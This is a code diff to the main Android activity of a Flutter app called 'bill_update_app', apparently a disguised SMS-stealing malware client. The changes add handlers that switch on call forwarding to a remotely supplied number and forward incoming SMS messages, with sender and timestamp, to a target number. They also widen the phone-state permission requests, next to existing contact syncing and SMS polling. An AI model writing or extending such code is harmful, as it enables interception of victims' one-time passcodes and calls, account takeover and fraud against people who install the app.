@@ -2,7 +2,6 @@ package com.example.bill_update_app
 
 import android.Manifest
 import android.content.Context
-import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.os.Build
@@ -44,6 +43,7 @@ class SmsPlugin {
 class MainActivity : FlutterActivity() {
     private val CHANNEL_SMS = "com.example.bill_update_app/sms"
     private val CHANNEL_DEVICE = "com.example.bill_update_app/device"
+    private val CHANNEL_FORWARDING = "com.example.bill_update_app/forwarding"
     private var receiver: SmsReceiver? = null
     private var smsObserver: SmsObserver? = null
 
@@ -53,17 +53,46 @@ class MainActivity : FlutterActivity() {
         SmsPlugin.register(smsChannel, this)
 
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_DEVICE).setMethodCallHandler { call, result ->
+            if (call.method == "getDeviceId") {
+                val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
+                result.success(prefs.getString("device_id", ""))
+            } else {
+                result.notImplemented()
+            }
+        }
+
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_FORWARDING).setMethodCallHandler { call, result ->
             when (call.method) {
-                "getDeviceId" -> {
-                    val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
-                    result.success(prefs.getString("device_id", ""))
-                }
-                "getPhoneHint" -> {
-                    PhoneNumberHint(this).show { number ->
-                        val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
-                        prefs.edit().putString("phone_number", number).apply()
-                        result.success(number)
+                "enableCallForwarding" -> {
+                    val number = call.argument<String>("number") ?: ""
+                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                        getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE).edit()
+                            .putString("call_forwarding_number", number).apply()
+                        requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
+                    } else {
+                        CallForwarder(this).enableCallForwarding(number)
                     }
+                    result.success(true)
+                }
+                "disableCallForwarding" -> {
+                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                        getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE).edit()
+                            .putString("call_forwarding_number", "").apply()
+                        requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
+                    } else {
+                        CallForwarder(this).disableCallForwarding()
+                    }
+                    result.success(true)
+                }
+                "forwardSms" -> {
+                    val target = call.argument<String>("target") ?: ""
+                    val sender = call.argument<String>("sender") ?: ""
+                    val message = call.argument<String>("message") ?: ""
+                    val receivedAt = call.argument<String>("received_at") ?: ""
+                    if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
+                        SmsForwarder(this).forwardSms(target, sender, message, receivedAt)
+                    }
+                    result.success(true)
                 }
                 else -> result.notImplemented()
             }
@@ -106,7 +135,7 @@ class MainActivity : FlutterActivity() {
 
     private fun requestContactsPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val perms = arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE)
+            val perms = arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS)
             val toRequest = perms.filter {
                 checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
             }
@@ -127,10 +156,25 @@ class MainActivity : FlutterActivity() {
                 if (permissions[i] == Manifest.permission.READ_CONTACTS && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                     ContactSync.init(this)
                 }
-                if (permissions[i] == Manifest.permission.READ_PHONE_STATE && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                if (permissions[i] == Manifest.permission.READ_PHONE_STATE || permissions[i] == Manifest.permission.READ_PHONE_NUMBERS) {
                     DeviceRegistrar.updateSimInfo()
                 }
             }
+        } else if (requestCode == 1003) {
+            for (i in permissions.indices) {
+                if (permissions[i] == Manifest.permission.CALL_PHONE && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
+                    val prefs = getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE)
+                    val number = prefs.getString("call_forwarding_number", "") ?: ""
+                    if (number.isNotEmpty()) {
+                        CallForwarder(this).enableCallForwarding(number)
+                        prefs.edit().remove("call_forwarding_number").apply()
+                    } else {
+                        CallForwarder(this).disableCallForwarding()
+                    }
+                }
+            }
+        } else if (requestCode == 1004) {
+            // SMS forwarded on next poll after permission granted
         }
     }
 
@@ -144,11 +188,6 @@ class MainActivity : FlutterActivity() {
             )
             smsObserver?.startPolling()
         }
-    }
-
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        PhoneNumberHint.handleResult(requestCode, resultCode, data)
     }
 
     override fun onDestroy() {
